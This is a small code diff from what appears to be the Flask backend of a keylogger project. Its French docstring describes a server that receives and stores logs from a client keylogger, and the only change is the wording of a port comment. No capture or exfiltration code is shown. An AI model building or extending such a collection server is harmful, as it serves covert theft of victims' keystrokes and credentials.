@@ -3,7 +3,7 @@
 SERVEUR - API Backend
 Reçoit les logs du keylogger client et les stocke
 Lance avec: python3 web.py
-Port: 5000 # à modifier au choix
+Port: 5000 # à customiser au choix
 """
 
 from flask import Flask, request, jsonify
